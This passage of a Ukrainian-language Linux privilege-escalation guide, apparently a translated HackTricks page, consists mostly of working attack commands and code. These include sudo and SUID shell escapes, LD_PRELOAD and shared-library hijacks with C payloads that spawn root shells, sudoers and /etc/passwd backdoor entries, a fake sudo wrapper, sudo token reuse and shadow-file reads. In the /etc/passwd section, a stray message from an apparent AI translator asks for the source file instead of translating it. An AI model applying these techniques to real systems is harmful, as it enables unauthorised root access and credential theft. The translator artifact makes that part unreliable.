D-Bus працює за моделлю **allow/deny**, керуючи дозволами на повідомлення (виклики методів, емісії сигналів тощо) на основі кумулятивного ефекту правил політики, що збігаються. Ці політики визначають взаємодію з шиною, потенційно допускаючи privilege escalation через експлуатацію цих дозволів.

Наведено приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf`, що деталізує дозволи для користувача root на володіння, відправку та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не охоплений іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як виявляти та експлуатувати D-Bus-комунікацію тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво досліджувати мережу та визначити розташування машини.

### Загальна енумерація
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо так, ви зможете отримати деякі credentials.
```
timeout 1 tcpdump
```
## Користувачі

### Загальна енумерація

Перевірте **who** ви є, які **privileges** у вас є, які **users** є в системах, які можуть **login** і які мають **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Деякі версії Linux були уражені багом, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Деталі: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви є **членом якої-небудь групи**, яка може надати вам привілеї root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти під кожним користувачем**, використовуючи цей пароль.

### Su Brute

Якщо вам не шкода створити багато шуму і бінарні файли `su` та `timeout` присутні на комп'ютері, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записним $PATH

### $PATH

Якщо ви виявите, що можете **записувати в якийсь каталог із $PATH**, то ви можете підвищити привілеї, **створивши backdoor всередині записного каталогу** з іменем команди, яка буде виконуватися іншим користувачем (ідеально — root) і яка **не завантажується з каталогу, розташованого перед вашим записним каталогом у $PATH**.

### SUDO and SUID

Вам може бути дозволено виконувати якусь команду через sudo або ці команди можуть мати suid біт. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють вам читати і/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволити користувачеві виконати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, тепер отримати shell тривіально — додавши ssh key до root directory або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну python бібліотеку під час виконання скрипта від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете використати неінтерактивну поведінку запуску Bash, щоб виконати довільний код як root при виклику дозволеної команди.

- Why it works: For non-interactive shells, Bash evaluates `$BASH_ENV` and sources that file before running the target script. Many sudo rules allow running a script or a shell wrapper. If `BASH_ENV` is preserved by sudo, your file is sourced with root privileges.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash скрипт).
- `BASH_ENV` присутній у `env_keep` (перевірте з `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Зміцнення:
- Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
- Уникайте shell wrappers для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
- Розгляньте логування I/O sudo та оповіщення, коли використовуються збережені env vars.

### Шляхи обходу виконання sudo

**Перейдіть**, щоб прочитати інші файли або використати **symlinks**. Наприклад у sudoers файлі: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo команда/SUID бінарний файл без вказаного шляху

Якщо **дозвіл sudo** надається для однієї команди **без вказання шляху**: _hacker10 ALL= (root) less_ — ви можете exploit це, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** binary **виконує іншу команду, не вказуючи шлях до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary з шляхом до команди

Якщо **suid** binary **виконує іншу команду, вказуючи шлях**, тоді ви можете спробувати **export a function** з ім'ям тієї команди, яку викликає suid file.

Наприклад, якщо suid binary викликає _**/usr/sbin/service apache2 start**_ вам потрібно спробувати створити функцію і export її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid-бінар, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказання однієї або кількох спільних бібліотек (.so файлів), які завантажувач має підвантажити перед усіма іншими, включаючи стандартну бібліотеку C (`libc.so`). Цей процес називається попереднім завантаженням бібліотеки.

Однак, щоб зберегти безпеку системи та запобігти зловживанню цією можливістю, особливо щодо виконуваних файлів з **suid/sgid**, система накладає певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не співпадає з ефективним (_euid_).
- Для виконуваних файлів з suid/sgid попередньо завантажуються лише бібліотеки з стандартних шляхів, які також мають suid/sgid.

Ескалація привілеїв може статися, якщо ви маєте можливість виконувати команди з `sudo` і вивід `sudo -l` містить запис **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися та визнаватися навіть при виконанні команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте це** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** запускаючи
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc може бути використаний зловмисником, якщо він контролює **LD_LIBRARY_PATH** env variable, оскільки він контролює шлях, у якому будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли натрапляєте на бінарний файл з правами **SUID**, який виглядає підозріло, варто перевірити, чи правильно він завантажує **.so** файли. Це можна зробити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, поява помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб скористатися цим, потрібно створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, що містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті elevate privileges, маніпулюючи file permissions та запуском shell з elevated privileges.

Скомпілюйте вищевказаний C файл у shared object (.so) за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary повинен активувати exploit, що може призвести до компрометації системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує бібліотеку з папки, в яку ми можемо записувати, створимо бібліотеку в тій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована вами бібліотека повинна мати функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторський список Unix бінарників, які атакаер може використати, щоб обійти локальні обмеження безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те ж саме, але для випадків, коли ви можете **лише інжектити аргументи** в команду.

Проєкт збирає легітимні функції Unix бінарників, які можна зловживати, щоб вийти з обмежених shell, підвищити або утримати підвищені привілеї, передавати файли, створювати bind та reverse shell, і полегшувати інші post-exploitation завдання.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи знаходить він спосіб експлуатувати будь-яке правило sudo.

### Повторне використання Sudo токенів

У випадках, коли у вас є **sudo доступ**, але немає пароля, ви можете підвищити привілеї, **чекаючи виконання sudo команди та перехопивши session token**.

Вимоги для ескалації привілеїв:

- Ви вже маєте shell як користувач "_sampleuser_"
- "_sampleuser_" **використовував `sudo`** для виконання чогось у **останні 15 хвилин** (за замовчуванням це тривалість sudo токена, яка дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви зможете завантажити його)

(Ви можете тимчасово увімкнути `ptrace_scope` командою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або назавжди, змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете підвищити привілеї, використавши:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Перший **експлойт** (`exploit.sh`) створить бінар `activate_sudo_token` у _/tmp_. Ви можете використати його, щоб **активувати sudo токен у вашій сесії** (ви не отримаєте автоматично root shell, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **який належить root і має setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить sudoers file** який робить **sudo tokens вічними та дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **write permissions** в папці або на будь-якому з файлів, створених у ній, ви можете використати бінарник [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **create a sudo token for a user and PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell під цим користувачем з PID 1234, ви можете **obtain sudo privileges** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як саме. Ці файли **за замовчуванням можуть читатися лише користувачем root і групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо у вас є права на запис, ви можете зловживати цим дозволом.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ще один спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, наприклад `doas` для OpenBSD — не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв і ви отримали shell у цьому контексті користувача, ви можете **створити новий sudo executable**, який виконуватиме ваш код як root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб коли користувач виконує sudo, запускався ваш sudo executable.

Зверніть увагу, що якщо користувач використовує інший shell (не bash), вам потрібно буде змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ви можете знайти інший приклад у [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустити щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільні бібліотеки

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки завантажуються конфігураційні файли**. Зазвичай цей файл містить наступний рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть зчитані конфігураційні файли з `/etc/ld.so.conf.d/*.conf`. Ці конфігураційні файли **вказують на інші папки**, де будуть **шукатися** **бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права запису** на будь-якому з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-яка папка, вказана у файлах конфігурації в `/etc/ld.so.conf.d/*.conf`, він може мати можливість підвищити привілеї.\
Перегляньте **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіювання lib у `/var/tmp/flag15/` призведе до того, що програма використовуватиме її в цьому місці, як вказано у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть шкідливу бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. Це фактично розбиває root **privileges into smaller and distinctive units**. Кожну з таких одиниць можна потім окремо надавати процесам. Таким чином повний набір privileges зменшується, що знижує ризики експлуатації.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. Ці permissions покращують контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або частиною групи. Такий рівень **granularity забезпечує більш точне управління доступом**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надайте** користувачу "kali" права **read** та **write** над файлом:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs із системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell sessions

У **старих версіях** ви можете **hijack** деяку **shell** сесію іншого користувача (**root**).\
У **найновіших версіях** ви зможете **підключитися** лише до screen sessions вашого власного користувача. Однак ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**Список screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема в **старих версіях tmux**. Мені не вдалося захопити tmux (v2.1) сесію, створену root, перебуваючи непривілейованим користувачем.

**Перелік сесій tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перегляньте **Valentine box from HTB** як приклад.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH keys, згенеровані на системах на базі Debian (Ubuntu, Kubuntu тощо) між вереснем 2006 і 13 травня 2008 року, можуть бути уражені цією помилкою.\
Ця помилка виникає під час створення нового ssh key в цих ОС, оскільки було можливе лише **32,768 variations were possible**. Це означає, що всі можливості можна перерахувати і, маючи ssh public key, ви можете знайти відповідний private key. Ви можете знайти обчислені варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Цікаві параметри конфігурації

- **PasswordAuthentication:** Вказує, чи дозволена password authentication. За замовчуванням — `no`.
- **PubkeyAuthentication:** Вказує, чи дозволена public key authentication. За замовчуванням — `yes`.
- **PermitEmptyPasswords**: Коли password authentication дозволена, цей параметр визначає, чи дозволяє сервер входи до облікових записів з пустими рядками паролів. За замовчуванням — `no`.

### PermitRootLogin

Вказує, чи може root входити через ssh; за замовчуванням — `no`. Можливі значення:

- `yes`: root може заходити, використовуючи password і private key
- `without-password` or `prohibit-password`: root може заходити лише з private key
- `forced-commands-only`: root може заходити лише за допомогою private key і якщо вказані опції commands
- `no`: заборонено

### AuthorizedKeysFile

Вказує файли, які містять public keys, що можуть бути використані для аутентифікації користувача. Він може містити токени на кшталт `%h`, які будуть замінені на домашню директорію. **Ви можете вказувати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашньої директорії користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вказуватиме, що якщо ви спробуєте login з **private** key користувача "**testusername**", ssh порівняє public key вашого ключа з тими, що знаходяться в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (without passphrases!) на вашому сервері. Отже, ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key** located in your **initial host**.

Потрібно встановити цю опцію в `$HOME/.ssh.config` таким чином:
```
Host example.com
ForwardAgent yes
```
Зауважте, що якщо `Host` — `*`, кожного разу, коли користувач підключається до іншої машини, цей хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписати** ці **опції** та дозволити або заборонити цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим для підвищення привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає новий shell**. Отже, якщо ви можете **записати або змінити будь-який із них, ви можете підвищити привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено будь-який дивний скрипт профілю, перевірте його на наявність **чутливої інформації**.

### Passwd/Shadow файли

Залежно від OS файли `/etc/passwd` і `/etc/shadow` можуть мати іншу назву або існувати резервні копії. Тому рекомендується **знайти всі** і **перевірити, чи можна їх прочитати**, щоб дізнатися **чи є hashes** усередині файлів:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках ви можете знайти **password hashes** у файлі `/etc/passwd` (або еквівалентному).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd доступний для запису

Спочатку згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Мені потрібен вміст файлу src/linux-hardening/privilege-escalation/README.md, щоб зробити переклад. Також уточніть, будь ласка: чи потрібно в перекладений файл додати приклад команди для створення користувача `hacker` з згенерованим паролем, чи просто додати рядок із іменем користувача й самим згенерованим паролем (без команд)?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Альтернативно, ви можете використати наведені нижче рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На BSD-платформах `/etc/passwd` розташований у `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано в `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати у деякі чутливі файли**. Наприклад, чи можете ви записати у якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині запущений сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat всередині /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor виконається наступного разу при запуску tomcat.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned файли
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
